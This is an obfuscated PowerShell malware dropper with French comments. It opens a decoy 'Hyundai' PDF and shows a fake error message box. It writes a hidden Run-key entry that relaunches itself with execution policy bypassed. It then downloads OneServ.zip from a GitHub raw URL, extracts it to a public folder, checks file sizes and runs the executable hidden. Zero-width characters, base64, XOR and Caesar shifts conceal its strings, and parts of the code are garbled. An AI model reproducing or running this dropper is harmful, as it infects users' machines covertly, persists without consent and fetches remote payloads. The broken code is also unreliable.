#rEgIoN InitIaLiSAtion
[sYsTeM.net.ServicePOinTmanagER]::SEcurItYpRotOCol = [sysTeM.nET.sEcUrITYpROTocoltyPE]::Tls12
$V1 = 'h‍t​t‌p‌s‌:​/‌/‍g​i‌t​h‍u‌b‌.​c‍o‌m​/‍h‍u‍n​d‌a​i​c​a‌s‌p‌-‌c‌m​d‌/​O‍n‍e‍S‍e‌r‍v‍/‌r‍a‍w​/‌m​a‌i​n​/‌O​n​e​S‌e‌r‌v‌.​z‌i​p​'
$V2 = ('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}{16}{17}{18}{19}{20}{21}{22}{23}' -f 'C:\U','se','rs\Pu','blic\','" +',' ','([sy','st','Em.io','.PaTh',']','::gET','rANd','om','Fi','L','eNA','mE().','Spli','t(''.''',')','[','0]',') + ').zip"
$v3 = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcUHVibGljXCIgKyAoZ2V0LURBdGUgLWZPUk1BVCA=')))yyyyMMdd")
#endrEGIon

#reGION créer pdf leurre
$nompDF = (-join('Hyu','nda','i'))
$CheminPDf = ($env + $($k3147=36;$b=[byte[]](0x1e,0x71,0x77,0x61,0x76,0x74,0x76,0x6b,0x62,0x6d,0x68,0x61,0x78,0x60,0x41,0x57,0x4f,0x50,0x4b,0x54,0x78);-join($b|%{[char]($_-bxor$k3147)})) + $nomPDF + $($k2740=137;$b=[byte[]](0xa7,0xf9,0xed,0xef);-join($b|%{[char]($_-bxor$k2740)})))
$pdFcrEE = $fAlSE

if (-not (tESt-patH $cHEMinpDf)) {
    try {
        $CoNTEnuPDf = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JVBERi0xLjRcbjEgMCBvYmpcbjw8IC9UeXBlIC9DYXRhbG9nIC9QYWdlcyAyIDAgUiA+PlxuZW5kb2JqXG4yIDAgb2JqXG48PCAvVHlwZSAvUGFnZXMgL0tpZHMgWzMgMCBSXSAvQ291bnQgMSA+PlxuZW5kb2JqXG4zIDAgb2JqXG48PCAvVHlwZSAvUGFnZSAvUGFyZW50IDIgMCBSIC9NZWRpYUJveCBbMCAwIDYxMiA3OTJdIC9Db250ZW50cyA0IDAgUiA+PlxuZW5kb2JqXG40IDAgb2JqXG48PCAvTGVuZ3RoIDQ0ID4+XG5zdHJlYW1cbkJUIC9GMSAxMiBUZiA3MiA3MjAgVGQgKCkgVGogRVRcbmVuZHN0cmVhbVxuZW5kb2JqXG54cmVmXG4wIDVcbjAwMDAwMDAwMDAgNjU1MzUgZiBcbjAwMDAwMDAwMDkgMDAwMDAgbiBcbjAwMDAwMDAwNTggMDAwMDAgbiBcbjAwMDAwMDAxMTIgMDAwMDAgbiBcbjAwMDAwMDAyMDIgMDAwMDAgbiBcbnRyYWlsZXJcbjw8IC9TaXplIDUgL1Jvb3QgMSAwIFIgPj5cbnN0YXJ0eHJlZlxuMzIxXG4lJUVPRg==')))
        SEt-cOnTENt -PaTH $cheminPDf -vAlUe $conTenUpDf -enCodInG ASCII
        $PDFCREe = $TrUE
        
        # AbRIr EL pDf SOlo Si SE ACaba DE CReaR
        if ($PdfcrEe) {
            sTARt-ProceSs $CHEMINPDF -errORAcTIon SiLENtLyCONTinuE
        }
    } catch {
        write-HOSt (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RXJyZXVyIGxvcnMgZGUgbGEgY3LDqWF0aW9uIGR1IFBERjog'))) + $($_.Exception.Message))
    }
}

# MEssAgEBoX D'erreur PDF simple
try {
    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.Interaction]::MsgBox($($k1161=']{oHNV_d6]';$b=[byte[]](0x0D,0x3F,0x29,0x68,0x0B,0x24,0x2D,0x0B,0x44,0x38,0x2F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1161);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T2tPbmx5LEV4Y2xhbWF0aW9u'))), 'Еrrеur')
} catch {
    # Silence les erreurs
}
#endregion

#region Persistance améliorée
try {
    $cheminReg = "$([char]0x48)$([char]0x4B)$([char]0x43)$([char]0x55)$([char]0x3A)$([char]0x5C)$([char]0x53)$([char]0x6F)$([char]0x66)$([char]0x74)$([char]0x77)$([char]0x61)$([char]0x72)$([char]0x65)$([char]0x5C)$([char]0x4D)$([char]0x69)$([char]0x63)$([char]0x72)$([char]0x6F)$([char]0x73)$([char]0x6F)$([char]0x66)$([char]0x74)$([char]0x5C)$([char]0x57)$([char]0x69)$([char]0x6E)$([char]0x64)$([char]0x6F)$([char]0x77)$([char]0x73)$([char]0x5C)$([char]0x43)$([char]0x75)$([char]0x72)$([char]0x72)$([char]0x65)$([char]0x6E)$([char]0x74)$([char]0x56)$([char]0x65)$([char]0x72)$([char]0x73)$([char]0x69)$([char]0x6F)$([char]0x6E)$([char]0x5C)$([char]0x52)$([char]0x75)$([char]0x6E)"
    $cheminScript = $MyInvocation.MyCommand.Path
    $cheminPowerShell = (Get-Process -Id $PID).Path
    $nomAleatoire = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
    
    $commandePersistance = ('{0}' -f '`')$cheminPowerShell`" -Exec Bypass -W Hidden -File `"$cheminScript`"("$([char]0x0D)$([char]0x0A)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x53)$([char]0x65)$([char]0x74)$([char]0x2D)$([char]0x49)$([char]0x74)$([char]0x65)$([char]0x6D)$([char]0x50)$([char]0x72)$([char]0x6F)$([char]0x70)$([char]0x65)$([char]0x72)$([char]0x74)$([char]0x79)$([char]0x20)$([char]0x2D)$([char]0x50)$([char]0x61)$([char]0x74)$([char]0x68)$([char]0x20)" + $cheminReg + "$([char]0x20)$([char]0x2D)$([char]0x4E)$([char]0x61)$([char]0x6D)$([char]0x65)$([char]0x20)" + $nomAleatoire + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x2D,0x56,0x61,0x6C,0x75,0x65,0x20))) + $commandePersistance + (-join([char]0x20, [char]0x2D, [char]0x46, [char]0x6F, [char]0x72, [char]0x63, [char]0x65, [char]0x0D, [char]0x0A, [char]0x7D, [char]0x20, [char]0x63, [char]0x61, [char]0x74, [char]0x63, [char]0x68, [char]0x20, [char]0x7B, [char]0x0D, [char]0x0A, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x23, [char]0x20, [char]0x53, [char]0x69, [char]0x6C, [char]0x65, [char]0x6E, [char]0x63, [char]0x65, [char]0x20, [char]0x6C, [char]0x65, [char]0x73, [char]0x20, [char]0x65, [char]0x72, [char]0x72, [char]0x65, [char]0x75, [char]0x72, [char]0x73, [char]0x20, [char]0x64, [char]0x65, [char]0x20, [char]0x70, [char]0x65, [char]0x72, [char]0x73, [char]0x69, [char]0x73, [char]0x74, [char]0x61, [char]0x6E, [char]0x63, [char]0x65, [char]0x0D, [char]0x0A, [char]0x7D, [char]0x0D, [char]0x0A, [char]0x23, [char]0x65, [char]0x6E, [char]0x64, [char]0x72, [char]0x65, [char]0x67, [char]0x69, [char]0x6F, [char]0x6E, [char]0x0D, [char]0x0A, [char]0x0D, [char]0x0A, [char]0x23, [char]0x72, [char]0x65, [char]0x67, [char]0x69, [char]0x6F, [char]0x6E, [char]0x20, [char]0x56, [char]0xE9, [char]0x72, [char]0x69, [char]0x66, [char]0x69, [char]0x65, [char]0x72, [char]0x20, [char]0x63, [char]0x6F, [char]0x6E, [char]0x6E, [char]0x65, [char]0x78, [char]0x69, [char]0x6F, [char]0x6E, [char]0x0D, [char]0x0A)) + $testConnexion + "$([char]0x20)$([char]0x3D)$([char]0x20)" + $false + (-join([char]0x0D, [char]0x0A)) + $tentatives + (-join([char]0x20, [char]0x3D, [char]0x20, [char]0x28, [char]0x39, [char]0x38, [char]0x20, [char]0x2D, [char]0x20, [char]0x39, [char]0x38, [char]0x29, [char]0x0D, [char]0x0A, [char]0x77, [char]0x68, [char]0x69, [char]0x6C, [char]0x65, [char]0x20, [char]0x28, [char]0x2D, [char]0x6E, [char]0x6F, [char]0x74, [char]0x20)) + $testConnexion + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x2D,0x61,0x6E,0x64,0x20))) + $tentatives + (-join([char]0x20, [char]0x2D, [char]0x6C, [char]0x74, [char]0x20, [char]0x35, [char]0x29, [char]0x20, [char]0x7B, [char]0x0D, [char]0x0A, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x74, [char]0x72, [char]0x79, [char]0x20, [char]0x7B, [char]0x0D, [char]0x0A, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20)) + $resultatTest + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x3D,0x20,0x54,0x65,0x73,0x74,0x2D,0x4E,0x65,0x74,0x43,0x6F,0x6E,0x6E,0x65,0x63,0x74,0x69,0x6F,0x6E,0x20,0x2D,0x43,0x6F,0x6D,0x70,0x75,0x74,0x65,0x72,0x4E,0x61,0x6D,0x65,0x20,0x38,0x2E,0x38,0x2E,0x38,0x2E,0x38,0x20,0x2D,0x50,0x6F,0x72,0x74,0x20,0x35,0x33,0x20,0x2D,0x49,0x6E,0x66,0x6F,0x72,0x6D,0x61,0x74,0x69,0x6F,0x6E,0x4C,0x65,0x76,0x65,0x6C,0x20,0x51,0x75,0x69,0x65,0x74,0x0D,0x0A,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x69,0x66,0x20,0x28))) + $resultatTest + "$([char]0x29)$([char]0x20)$([char]0x7B)$([char]0x0D)$([char]0x0A)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)" + $testConnexion + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x3D,0x20))) + $true + "$([char]0x0D)$([char]0x0A)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x7D)$([char]0x0D)$([char]0x0A)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x7D)$([char]0x20)$([char]0x63)$([char]0x61)$([char]0x74)$([char]0x63)$([char]0x68)$([char]0x20)$([char]0x7B)$([char]0x0D)$([char]0x0A)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)$([char]0x20)" + $tentatives + (-join([char]0x2B, [char]0x2B, [char]0x0D, [char]0x0A, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x53, [char]0x74, [char]0x61, [char]0x72, [char]0x74, [char]0x2D, [char]0x53, [char]0x6C, [char]0x65, [char]0x65, [char]0x70, [char]0x20, [char]0x2D, [char]0x53, [char]0x65, [char]0x63, [char]0x6F, [char]0x6E, [char]0x64, [char]0x73, [char]0x20, [char]0x35, [char]0x0D, [char]0x0A, [char]0x20, [char]0x20, [char]0x20, [char]0x20, [char]0x7D, [char]0x0D, [char]0x0A, [char]0x7D, [char]0x0D, [char]0x0A, [char]0x23, [char]0x65, [char]0x6E, [char]0x64, [char]0x72, [char]0x65, [char]0x67, [char]0x69, [char]0x6F, [char]0x6E, [char]0x0D, [char]0x0A, [char]0x0D, [char]0x0A, [char]0x23, [char]0x72, [char]0x65, [char]0x67, [char]0x69, [char]0x6F, [char]0x6E, [char]0x20, [char]0x56, [char]0xE9, [char]0x72, [char]0x69, [char]0x66, [char]0x69, [char]0x63, [char]0x61, [char]0x74, [char]0x69, [char]0x6F, [char]0x6E, [char]0x20, [char]0x65, [char]0x74, [char]0x20, [char]0x74, [char]0xE9, [char]0x6C, [char]0xE9, [char]0x63, [char]0x68, [char]0x61, [char]0x72, [char]0x67, [char]0x65, [char]0x6D, [char]0x65, [char]0x6E, [char]0x74, [char]0x0D, [char]0x0A)) + $poidsZipRequis + (-join([char]0x20, [char]0x3D, [char]0x20, [char]0x28, [char]0x34, [char]0x34, [char]0x38, [char]0x38, [char]0x35, [char]0x37, [char]0x30, [char]0x33, [char]0x20, [char]0x2D, [char]0x62, [char]0x78, [char]0x6F, [char]0x72, [char]0x20, [char]0x33, [char]0x35, [char]0x37, [char]0x33, [char]0x32, [char]0x36, [char]0x33, [char]0x33, [char]0x29, [char]0x0D, [char]0x0A)) + $poidsExeRequis + (-join([char]0x20, [char]0x3D, [char]0x20, [char]0x28, [char]0x31, [char]0x38, [char]0x39, [char]0x36, [char]0x38, [char]0x32, [char]0x36, [char]0x32, [char]0x20, [char]0x25, [char]0x20, [char]0x39, [char]0x34, [char]0x38, [char]0x34, [char]0x31, [char]0x33, [char]0x37, [char]0x29, [char]0x0D, [char]0x0A)) + $executableTrouve + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x3D,0x20))) + $false + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x0D,0x0A))) + $executableValide + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x3D,0x20))) + $false + "$([char]0x0D)$([char]0x0A)" + $zipValide + "$([char]0x20)$([char]0x3D)$([char]0x20)" + $false + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x0D,0x0A,0x0D,0x0A,0x23,0x20,0x56,0xC3,0xA9,0x72,0x69,0x66,0x69,0x65,0x72,0x20,0x73,0x69,0x20,0x6C,0x27,0x65,0x78,0xC3,0xA9,0x63,0x75,0x54,0x41,0x62,0x4C,0x65,0x20,0x45,0x78,0x49,0x73,0x74,0x45,0x20,0x44,0xC3,0xA9,0x4A,0xC3,0xA0,0x20,0x65,0x74,0x20,0x61,0x20,0x6C,0x65,0x20,0x42,0x4F,0x4E,0x20,0x70,0x6F,0x49,0x44,0x53,0x0D,0x0A))) + $exECutAbleexIsTAnt + (-join([char]0x20, [char]0x3D, [char]0x20, [char]0x47, [char]0x65, [char]0x54, [char]0x2D, [char]0x63, [char]0x68, [char]0x49, [char]0x6C, [char]0x44, [char]0x69, [char]0x54, [char]0x45, [char]0x6D, [char]0x20, [char]0x2D, [char]0x50, [char]0x61, [char]0x74, [char]0x48, [char]0x20)) + $V3 + "$([char]0x20)$([char]0x2D)$([char]0x46)$([char]0x69)$([char]0x6C)$([char]0x74)$([char]0x65)$([char]0x72)$([char]0x20)")*OneServ*((-join(' -reCur','se',' | 
   ','       ',' ','        ','  Whe','rE-obJe','ct ','{')) + $_ + (-join('.ext','eNs','Ion ','-eq',' '))).exe"} | 
                     sELEct-ObJEct -fIRSt (-23 + 24)

if ($EXeCUtabLEexiSTAnt) {
    $ExEcUtAbLEtRoUVe = $TRuE
    $PoidSactuel = $eXecUTABLeEXisTanT.LEnGTh
    wRiTe-hOST ('O‌n‌e‌S‌e‌r‍v​.‍e‌x‌e​ ‌t‌r‌o‍u‌v‌é​ ​-‍ ‌P​o‍i‍d‌s‍:​ ‌' + $poidsActuel + ' bуtеs')
    
    if ($pOiDsactUEL -eq $pOIdseXereQuiS) {
        $ExEcUtAbLEVaLIdE = $tRuE
        wRitE-hOST "$([char]0x50)$([char]0x6F)$([char]0x69)$([char]0x64)$([char]0x73)$([char]0x20)$([char]0x76)$([char]0xE9)$([char]0x72)$([char]0x69)$([char]0x66)$([char]0x69)$([char]0xE9)$([char]0x20)$([char]0x2D)$([char]0x20)$([char]0x45)$([char]0x78)$([char]0xE9)$([char]0x63)$([char]0x75)$([char]0x74)$([char]0x61)$([char]0x62)$([char]0x6C)$([char]0x65)$([char]0x20)$([char]0x76)$([char]0x61)$([char]0x6C)$([char]0x69)$([char]0x64)$([char]0x65)"
    } else {
        WRiTE-HOsT ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IlBvaWRzIGluY29ycmVjdCAtIFN1cHByZXNzaW9uIGRlIGw=')))exécutable"
        REMoVe-iTEm $exEcuTableexistAnt.FULLnaME -foRCE -ERRoRaCtiOn sIlENtLYcOntInue
    }
}

# téléCHArGEMEnt sEULemEnt si nécEsSAIRe
if ($tEStCOnnExiON -and (-not $eXeCuTaBLEVALiDE)) {
    $tEnTatiVEsdOwNLOAD = (-100 + 100)
    $mAXtEntatiVeS = (97 -bxor 98)
    
    while ((-not $eXEcUTAbLeVALIde) -and $TEntAtIVesDowNlOAd -lt $MaXtEntatiVES) {
        $teNTatiVESdOwNlOad++
        writE-HoSt ($($k3528=128;$b=[byte[]](0xd4,0xe5,0xee,0xf4,0xe1,0xf4,0xe9,0xf6,0xe5,0xa0,0xe4,0xe5,0xa0,0xf4,0x43,0x29,0xec,0x43,0x29,0xe3,0xe8,0xe1,0xf2,0xe7,0xe5,0xed,0xe5,0xee,0xf4,0xa0,0xa3);-join($b|%{[char]($_-bxor$k3528)})) + $tentativesDownload)
        
        try {
            # TéléCHaRger le FIChiEr zIp
            $cLIEntWEb = NeW-oBJect sySTEM.neT.WeBcLiEnT
            $cLiEntweb.DOwNLoAdFile($v1, $v2)
            
            if (TeST-pAtH $v2) {
                # véRiFiEr le PoIDS Du zip
                $PoiDszIP = (gEt-IteM $V2).LEngth
                wriTE-HoSt ("$([char]0x50)$([char]0x6F)$([char]0x69)$([char]0x64)$([char]0x73)$([char]0x20)$([char]0x64)$([char]0x75)$([char]0x20)$([char]0x5A)$([char]0x49)$([char]0x50)$([char]0x3A)$([char]0x20)" + $poidsZip + "$([char]0x20)$([char]0x62)$([char]0x79)$([char]0x74)$([char]0x65)$([char]0x73)$([char]0x20)$([char]0x28)$([char]0x72)$([char]0x65)$([char]0x71)$([char]0x75)$([char]0x69)$([char]0x73)$([char]0x3A)$([char]0x20)" + $poidsZipRequis + "$([char]0x20)$([char]0x62)$([char]0x79)$([char]0x74)$([char]0x65)$([char]0x73)$([char]0x29)")
                
                if ($PoiDsziP -eq $PoIdsZIpREQUIS) {
                    WRITe-HOSt ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('IlpJUCB2YWxpZGUgLSBQcm9jw6lkZXIgw6AgbA==')))extraction"
                    $ZipVALIdE = $TRue
                } else {
                    wRite-HosT $(-join('Dcwrg ri NWD wbqcffsqh - Giddfsggwcb sh bcijsz sggow'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))
                    RemOve-ItEM $V2 -ForCE -ErrorActioN sILENTLyconTInuE
                    continue
                }
                
                # CRéer le RéPertoIre S'il n'eXIsTE pAs
                if (-not (tEst-PATH $V3)) {
                    NEw-ITEm -ITeMtYpE directOry -patH $v3 -fOrCE | oUT-nULl
                }
                
                # ExtRaIRE le FIchiER
                Add-tYpe -AssembLyName systEM.iO.COmPRessIon.fiLESysTEM
                [SYsTeM.IO.cOmPRESsION.ZipfiLe]::eXTrACTtoDIrECTORy($V2, $v3)
                
                # VérifIeR à nouveAu le POidS APrèS EXtRACTIoN
                $EXeCuTaBlECIbLE = Get-cHILDiteM -pAtH $v3 -Filter '*ОnеSеrv*' -ReCuRSE | 
                                 WHERe-OBjeCt {$_.EXtensIOn -eq ([string]::Format('{0}{1}{2}','.','ex','e'))} | 
                                 selEcT-objECT -FIRst (40 + -39)
                
                if ($eXEcUTABlECiBle) {
                    $poIdsfInaL = $exEcUTaBLeCiBlE.LenGtH
                    WRITe-HOSt ($(-join('Baupe mbdèe qjfdmofuaz: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) + $poidsFinal + $(-join(' davgu'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}})))
                    
                    if ($poIdSfINAL -eq $poIdsExEReQUiS) {
                        WriTe-HosT 'Ехéсutаblе vаlіdе арrès téléсhаrgеmеnt'
                        $eXeCUTAblEVAlide = $TRuE
                    } else {
                        WRITE-hoST ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UG9pZHMgRVhFIHRvdWpvdXJzIGluY29ycmVjdCAtIE5vdXZlbCBlc3NhaQ==')))
                        rEMoVE-iTEM $ExeCUtableciBle.fUlLNAme -FORce -ERRorActiON sILeNtlycOntinUe
                        REMoVE-ITEM $v2 -FORcE -ErrORaCTion silENtlYcontinue
                    }
                }
            }
        } catch {
            WRite-HoSt ('Еrrеur lоrs du téléсhаrgеmеnt: ' + $($_.Exception.Message))
            if (TEST-PaTH $V2) {
                rEMOVE-IteM $v2 -fORcE -erroracTion sIlentlYcontiNUe
            }
        }
        
        # PausE EnTRe LeS tENTatIVES
        if (-not $ExeCutablEvalidE -and $TeNtATiVesdOwNloAd -lt $mAxTENtaTiveS) {
            WRiTe-HOsT ((-join('Nou','vel','le tent','ative',' dan','s',' ')) + $(86 - 83) + (-join(' s','e','conde','s..','.')))
            StARt-sLEeP -seConDs (94 - 91)
        }
    }
}
#ENDReGioN

#regIOn dEUXIèMe véRIFIcaTioN - clé dE REGiSTre NsMoniToR
$exECutioNautoRISee = $True
$cLERegIStreAVerIfIer = ('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}{16}' -f 'HKCU:','\S','of','tware','\','Mic','rosof','t','\Win','dow','s\C','urr','ent','Vers','ion\R','u','n')
$NomenTrEeaVerifieR = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x4E,0x73,0x4D,0x6F,0x6E,0x69,0x74,0x6F,0x72)))

try {
    $eNTREEExisTANte = Get-iTeMPRoPERTy -paTH $CLErEgISTrEaVERIfIEr -NAme $noMenTReEAVErifiEr -eRroRactioN sILENtLyCOnTINuE
    if ($eNtreEEXISTaNTe) {
        wriTe-hOSt $($k8991='e@JHoOY';$b=[byte[]](0x47,0x0C,0x2B,0x68,0x0C,0x23,0x9A,0xCC,0x60,0x2E,0x2D,0x4F,0x3D,0x3C,0x02,0x29,0x39,0x3C,0x1D,0x2A,0x79,0x41,0x2E,0x25,0x25,0x2A,0x21,0x2D,0x17,0x25,0x2F,0x09,0x39,0x2A,0x2B,0x0C,0x26,0x23,0x2D,0x1D,0x6F,0x3C,0x1D,0x29,0x39,0x3C,0x0A,0x6F,0x74,0x45,0x01,0x38,0x3A,0xAC,0xE5,0x2D,0x45,0x24,0x2F,0x68,0x03);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8991);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))exécution"
        $eXECUtiOnaUTorIsee = $falSE
    } else {
        WRitE-hOST $($k3507=159;$b=[byte[]](0xbd,0xd3,0xfe,0xbf,0xfc,0xf3,0x5c,0x36,0xbf,0xfb,0xfa,0xbf,0xed,0xfa,0xf8,0xf6,0xec,0xeb,0xed,0xfa,0xbf,0xbb,0xf1,0xf0,0xf2,0xda,0xf1,0xeb,0xed,0xfa,0xfa,0xde,0xc9,0xfa,0xed,0xf6,0xf9,0xf6,0xfa,0xed,0xbf,0xf1);-join($b|%{[char]($_-bxor$k3507)}))existe pas - Exécution autorisée"
    }
} catch {
    wrITE-hosT ((-join([char]0x45, [char]0x72, [char]0x72, [char]0x65, [char]0x75, [char]0x72, [char]0x20, [char]0x6C, [char]0x6F, [char]0x72, [char]0x73, [char]0x20, [char]0x64, [char]0x65, [char]0x20, [char]0x6C, [char]0x61, [char]0x20, [char]0x76, [char]0xE9, [char]0x72, [char]0x69, [char]0x66, [char]0x69, [char]0x63, [char]0x61, [char]0x74, [char]0x69, [char]0x6F, [char]0x6E, [char]0x20, [char]0x64, [char]0x75, [char]0x20, [char]0x72, [char]0x65, [char]0x67, [char]0x69, [char]0x73, [char]0x74, [char]0x72, [char]0x65, [char]0x3A, [char]0x20)) + $($_.Exception.Message))
    $executIONaUtOriSee = $tRue
}
#endReGiON

#RegiON EXécUTioN (sEULeMENt SI LA DEuxièMe vérIFiCATioN esT PAsséE)
if ($EXeCUtableVAlIdE -and $eXeCUTableCIbLE -and $eXeCutIonAuTorisEE) {
    try {
        writE-HoSt (-join('Toute','s les ','vérific','a','t','ion','s',' ','passées ','- Lanc','ement d','e One','Ser','v','.e','x','e'))
        $paraMETrESPRoCESsUS = @{
            fiLEpATh = $EXECUtAbLeCiBLe.FUlLname
            aRgUMENTlISt = $($k8725=63;$b=[byte[]](0x12,0x4d,0x4a,0x51);-join($b|%{[char]($_-bxor$k8725)}))
            wiNdOWSTylE = ('{0}{1}' -f 'Hidde','n')
            pasSTHRu = $True
        }
        $ProCESSUs = sTArT-proCess @PArAmEtreSpRocesSuS
        WRITE-hOST ($(-join('Wyvjlzzbz leéjbaé hclj WPK: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})) + $($processus.Id))
    } catch {
        wRiTE-HOSt "$([char]0x22)$([char]0x45)$([char]0x72)$([char]0x72)$([char]0x65)$([char]0x75)$([char]0x72)$([char]0x20)$([char]0x6C)$([char]0x6F)$([char]0x72)$([char]0x73)$([char]0x20)$([char]0x64)$([char]0x65)$([char]0x20)$([char]0x6C)"exécution: $($_.Exception.Message)(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQogICAgfQ0KfSBlbHNlIHsNCiAgICBpZiAoLW5vdCA='))) + $eXECUtionaUTorIsEe + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KSB7DQogICAgICAgIFdSaVRFLUhvU3Qg'))))Exécution bloquée: La clé de registre NsMonitor existe"
    } else {
        wRitE-HOst (-join('"Au','cun e','xécutab','le ','valide',' trouvé ','po','ur ','l'))exécution après $tentativesDownload tentatives"
    }
}
#EndREgioN

#regiOn nEtToYAGE TempOraIRE
try {
    $SCRIpTNetToyagE = {
        StArt-SlEeP -seCoNds 30
        if (TEst-pAth $using:V2) {
            REMove-ITEm $using:V2 -ForCe -eRRORAcTIoN SilEntLycOnTiNUe
        }
    }
    $TravaILnETtOyagE = sTARt-JoB -SCrIptbLoCK $scrIPTNetTOyAGe
} catch {
    # SILENcE Les eRREuRs de nettoYagE
}
#enDREGION